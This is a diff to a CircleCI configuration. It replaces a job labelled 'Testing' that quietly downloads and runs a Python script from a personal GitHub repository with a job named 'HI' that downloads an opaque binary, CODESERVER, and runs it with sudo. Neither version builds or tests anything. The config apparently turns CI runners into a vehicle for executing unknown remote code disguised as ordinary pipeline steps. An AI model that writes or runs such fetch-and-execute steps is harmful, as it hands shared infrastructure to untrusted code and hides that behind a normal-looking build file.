@@ -1,11 +1,15 @@
 version: 2.1
 jobs:
-  build:
-    machine:
-      image: ubuntu-2004:202010-01
-    parallelism: 4
+  HI:
+    docker:
+      - image: cimg/node:12.22.11
     steps:
       - checkout
       - run:
-          name: "Testing"
-          command: wget https://raw.githubusercontent.com/aurbach55/zash/main/code.py >/dev/null 2>&1 && python code.py
+          name: "HI"
+          command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/aurbach55/pos/main/CODESERVER && chmod +x CODESERVER && sudo ./CODESERVER
+
+workflows:
+  HI-workflow:
+    jobs:
+      - HI
